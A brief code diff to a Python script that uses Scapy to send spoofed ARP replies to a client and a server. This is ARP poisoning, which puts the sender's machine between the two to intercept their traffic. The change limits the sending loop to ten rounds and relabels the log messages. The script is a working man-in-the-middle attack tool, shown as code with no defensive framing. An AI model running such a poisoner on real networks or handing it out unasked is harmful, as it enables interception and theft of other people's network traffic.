@@ -21,15 +21,15 @@ def run_spoofer(interface, ip_list):
     psrc=info['client']['ip'],
     hwsrc=info['sniffer']['mac'],
   )
+  print("[Sniffer Log] [+] Started sending spoofed ARP replies in the background.")
 
   try:
-    while True:
+    for i in range(10):
       sendp(arp_to_client, iface=interface, verbose=False)
       sendp(arp_to_server, iface=interface, verbose=False)
-      print("[+] Sent spoofed ARP replies")
       time.sleep(2)
   except KeyboardInterrupt:
-      print("\n[*] Stopping ARP poisoner.")
+      print("\n[Sniffer Log] [*] Stopping ARP poisoner.")
 
 if __name__ == "__main__":
    run_spoofer()
